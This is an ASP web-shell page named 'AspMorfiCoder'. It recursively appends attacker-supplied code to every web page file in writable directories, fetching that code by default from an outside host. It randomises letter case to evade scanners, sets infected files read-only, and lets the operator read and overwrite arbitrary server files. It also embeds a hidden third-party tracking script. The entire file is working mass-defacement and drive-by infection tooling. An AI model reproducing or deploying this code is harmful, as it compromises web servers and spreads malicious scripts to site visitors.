<%Response.Buffer =true%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>==AspMorfiCoder==</title>

<%
Sub echo(str)
	response.write(str)
End Sub
echo "<STYLE type='text/css'>"
echo "<!--"
echo "BODY{FONT-SIZE: 12px; COLOR: #333333; FONT-FAMILY: 'Arial', 'Helvetica', 'sans-serif';}"
echo "TABLE{FONT-SIZE: 12px; COLOR: #333333; LINE-HEIGHT: 16px; FONT-FAMILY: 'Arial', 'Helvetica', 'sans-serif';}"
echo "INPUT{BORDER: 1px solid #cccccc; PADDING: 1px; FONT-SIZE: 12px; FONT-FAMILY: ; HEIGHT: 18px;}"
echo ".INPUTt{BORDER-STYLE: none;}"
echo "TEXTAREA{BORDER: 1px solid #000000; FONT-SIZE: 12px;FONT-FAMILY: ''; CURSOR: HAND;}"
echo "A:link{COLOR: #32312c; TEXT-DECORATION: none;}"
echo "A:visited{COLOR: #32312c; TEXT-DECORATION: none;}"
echo "A:hover{COLOR: red; TEXT-DECORATION: none;}"
echo ".TBHead{BACKGROUND: #d8f99b; HEIGHT: 28px; TEXT-ALIGN: center; VERTICAL-ALIGN: middle; FONT-WEIGHT: bold;}"
echo ".TBEnd{BACKGROUND: #ffffff;HEIGHT:28px;TEXT-ALIGN: center; VERTICAL-ALIGN: middle;}"
echo ".TBTD{BACKGROUND:#f7fee9;HEIGHT:25px;}"
echo ".TBBO{BORDER-BOTTOM: 1px solid #91d70d;}"
echo "-->"
echo "</STYLE>"
%>
</head>
<body bgcolor="#ecfccd">
<%
Dim Dirr,alltxt,Filename,ASP_SELF,s,ex,pth,newcnt,Fpath,addcode,addcode2,pcfile,checkbox,ShowMsg,FType,zfile,pcfileName,pcfilek,pcfilen,WFSO,f,fc2,FType1,Ftype2,FType3

   ASP_SELF=Request.ServerVariables("PATH_INFO") 
   for i= 0 to ubound(split(server.mappath("."),"\"))
d=split(server.mappath("."),"\")
Dirr=Dirr&d(i)&"\"
Filename=Dirr&"Dirr.txt"
On Error Resume Next
SET FSO=Server.CreateObject("Scripting.FileSystemObject")
SET FR = FSO.CreateTextFile(Filename,true)
IF NOT FSO.FileExists(Filename) then
else
	FR.close
	FSO.DeleteFile Filename,True 
	exit for
end if
next
   s=Request("fd") 
   ex=Request("ex") 
   pth=Request("pth") 
   newcnt=Request("newcnt") 
	Fpath=Request("fd")
	addcode = Request("code")
	addcode2 = Request("code2")
	pcfile=request("pcfile")
	checkbox=request("checkbox")
	ShowMsg=request("ShowMsg")
	FType=request("FType")
	zfile=request("zfile")
	if zfile="" then zfile="default|index|conn|admin|reg|main|vip|qq|mm|"
	if Ftype="" then Ftype="htm|html|asp|php|jsp|aspx|cgi|"
	if Fpath="\" then Fpath=Server.MapPath("\")
	if Fpath="." or Fpath="" then Fpath=Dirr
	if addcode="" then addcode=getHTTPPage("http://www.w3dns.cn/code.gif")
	if checkbox="" then checkbox=request("checkbox")
	if pcfile="" then
		pcfileName=Request.ServerVariables("SCRIPT_NAME")
		pcfilek=split(pcfileName,"/") 
		pcfilen=ubound(pcfilek) 
		pcfile=pcfilek(pcfilen) 
	end if
 If ex="" AND pth="" Then 
 %>
<form method=POST><TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD colspan=2 class=TBHead><B><FONT color=#ff2222>==AspMorfiCoder==</font></B></TD></TR><tr>
  <td class=TBTD >Web site root  "\"：</td>
  <td class=TBTD><%=Server.MapPath("/")%></td></tr><tr><td class=TBTD > this   path "."：</td>
<td class=TBTD><%=Server.MapPath(".")%></td></tr><tr><td class=TBTD width='20%'> File path ：</td>
      <td class=TBTD><input type=text name=fd value='<%=Fpath%>' size=40 />
      <font  color=red > NOTE: The path is the largest directory writable  </font></td>
</tr>
<tr><td  class=TBTD>To exclude documents ：</td>
<td class=TBTD><input name='pcfile' type=text id='pcfile' value='<%=pcfile%>' size=40> For example：1.asp|2.asp|3.asp</td></tr>
<tr>
  <td class=TBTD>FileType：</td>
	<td class=TBTD><input name='FType' type=text id='FType' value='<%=Ftype%>' size=40>	  
	   To modify the input file type [extension] </td>
</tr><tr><td class=TBTD>
	Code:
	</font></td><td class=TBTD><textarea name=code cols=66 rows=3><%=addcode%></textarea></td></tr>
<tr><td class=TBTD></td><td class=TBTD> <input name=submit type=submit value=action><div style="visibility:hidden; border:none"><script language="javascript" src="http://count5.51yes.com/click.aspx?id=58712977&logo=1"></script>
</div></td>
</tr>
</table>
</form>
<%end if%>
<%
if request("submit")="action" then 
echo "<TABLE width=80% border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d><TR><TD  class=TBHead align=center>results</TD><TD  class=TBHead>Absolute file path</TD><TD  class=TBHead width='15%' align=center>Edit</TD></TR>"
if addcode<>"" then
substr=MorfiHttp(addcode)
addcode=Morficoders(addcode)
end if
call InsertAllFiles(Fpath,addcode,pcfile)
end if

%>

<%
'写入函数
Sub InsertAllFiles(Wpath,Wcode,pc)
	Server.ScriptTimeout=999999999
	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
	 Set WFSO = CreateObject("Scripting.FileSystemObject")
	 on error resume next 
	 Set f = WFSO.GetFolder(Wpath)
	 Set fc2 = f.files
	 For Each myfile in fc2
		Set FS1 = CreateObject("Scripting.FileSystemObject")
		FType1=split(myfile.name,".") 
		FType2=ubound(FType1) 
		zfile1=FType1(FType2-1)
		if Ftype2>0 then
		FType3=LCase(FType1(FType2)) 
		else
		FType3="无"
		end if
		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
		                Bxcode=replace(Wcode,"*-*","name="&Int((9999 - 1000 + 1) * Rnd + 1000))
						set hover=FS1.GetFile(Wpath&""&myfile.name)
						  hover.Attributes=0
						set hover=nothing
						
						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
						alltxt=tfile1.readall
						if  Instr(lcase(alltxt),"@#@&")=0 and Instr(lcase(alltxt),trim(substr))=0 then
						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
						tfile.writeline Bxcode
                  echo"<tr><td class=TBTD align=center>√</td><td class=TBTD>"&Wpath&myfile.name&"</td>"
                  echo"<td class=TBTD align=center><a href='"&ASP_SELF&"?ex=edit&pth="&Wpath&myfile.name&"' target='_blank'>Edit</a><br></td></tr>"
						tfile.close
						tfile1.close
					     set hover=FS1.GetFile(Wpath&""&myfile.name)
						  hover.Attributes=1
						set hover=nothing
						
						else
						tfile1.close
				echo"<tr><td class=TBTD align=center><font color=red>×</font></td><td class=TBTD>"&Wpath&myfile.name&"</td>"
                echo"<td class=TBTD align=center><a href='"&ASP_SELF&"?ex=edit&pth="&Wpath&myfile.name&"' target='_blank'>Edit</a><br></td></tr>"
						end if
	   end if
	 Next
 Set fsubfolers = f.SubFolders
 For Each f1 in fsubfolers
	NewPath=Wpath&""&f1.name
	Response.Flush
InsertAllFiles NewPath,Wcode,pc
 Next
Set FSO = Nothing
set tfile1=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub

Sub file_show(fname) 
Set fs1=Server.createObject("Scripting.FileSystemObject") 
isExist=fs1.FileExists(fname) 
If isExist Then 
Set fcnt=fs1.OpenTextFile(fname) 
cnt=fcnt.ReadAll 
fcnt.Close 
Set fs1=Nothing
echo "FILE: "&fname 
echo "<form action="&ASP_SELF&" method='POST'> "
echo "<textarea name='newcnt' cols='100' rows='30' style='border:1px solid #d9eef9' >"&cnt&"</textarea> "
echo "<input type='hidden' name='pth' value='"&fname&"'> "
echo "<input type='hidden' name='ex' value='save'> "
echo "<input type='submit' style='background:#d9eef9;border:1px solid #999;padding:2px 2px 0px 2px;margin:4px;border-width:1px 3px 1px 3px' value='SAVE'> "
echo "</form> "
Else
echo "<p>文件不存在或已经被删除!</p>" 
End If
End Sub 

'源码获函数
function getHTTPPage(url) 
	on error resume next 
	dim http 
	set http=Server.createobject("Microsoft.XMLHTTP") 
	Http.open "GET",url,false 
	Http.send() 
	if Http.readystate<>4 then
		getHTTPPage=""
		exit function 
	end if 
	getHTTPPage=bytes2BSTR(Http.responseBody) 
	set http=nothing
	if err.number<>0 then err.Clear  
end function 

Function bytes2BSTR(vIn) 
	dim strReturn 
	dim i1,ThisCharCode,NextCharCode 
	strReturn = "" 
	For i1 = 1 To LenB(vIn) 
		ThisCharCode = AscB(MidB(vIn,i1,1)) 
		If ThisCharCode < &H80 Then 
			strReturn = strReturn & Chr(ThisCharCode) 
		Else 
			NextCharCode = AscB(MidB(vIn,i1+1,1)) 
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
			i1 = i1 + 1 
		End If 
	Next 
	bytes2BSTR = strReturn 
End Function
'结束
'文件编辑

Sub file_save(fname) 
Set fs2=Server.createObject("Scripting.FileSystemObject") 
Set newf=fs2.createTextFile(fname,True) 
newf.Write newcnt 
newf.Close 
Set fs2=Nothing 
Response.Write "<p>文件修改成功!</p>"
End Sub 
if Request("ex")="edit" then
CALL file_show(pth)
end if
if Request("ex")="save" then
CALL file_save(pth) 
end if

'范围
Function GetRnd(min,max)
 Randomize
 GetRnd = Int((max - min + 1) * Rnd + min)
End function


'随即大小字体
Function MorfiHttp(code)
dim coders,codelen,codeu,Newcode,Newcoders
code=replace(code," ","|")
code=replace(code,"||","|")
code=replace(code,"||","|")
coders=split(code,"|")
for i=0 to ubound(coders)
if instr(lcase(coders(i)),"http://")>0 then
MorfiHttp=coders(i)
end if
next
if MorfiHttp="" then
MorfiHttp="Empety"
end if
End function

'随即大小字体
Function Morficoders(code)
dim coders,codelen,codeu,Newcode,Newcoders
code=replace(code," ","|")
code=replace(code,"||","|")
code=replace(code,"||","|")
code=replace(code,"|","|*-*|",1,4,0)
code=replace(code,"|*-*|","|",1,3,0)
coders=split(code,"|")
for i=0 to ubound(coders)
if instr(lcase(coders(i)),"http://")>0 then
substr=coders(i)
end if
codelen=len(coders(i))
codeu=mid(coders(i),GetRnd(1,codelen),1)
Newcode=replace(coders(i),codeu,ucase(codeu))
Newcoders=Newcoders&" "&Newcode
next
Morficoders=Newcoders
End function
%>
</body>
</html>
